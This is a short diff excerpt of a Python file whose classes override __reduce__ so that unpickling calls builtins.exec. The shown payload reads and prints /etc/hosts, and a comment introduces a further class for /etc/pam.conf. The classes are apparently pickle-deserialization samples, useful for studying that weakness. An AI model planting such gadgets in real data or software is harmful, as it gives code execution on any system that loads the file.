@@ -16,6 +16,7 @@ class group(object):
 class hosts(object):
     def __reduce__(self):
         return (builtins.exec, ("with open('/etc/hosts','r') as r: print(r.readlines())",))
+
 # The PAM configuration file, /etc/pam. conf , determines the authentication services to be used, and the order in which the services are used.
 # This file can be edited to select authentication mechanisms for each system entry application.
 class pam(object):
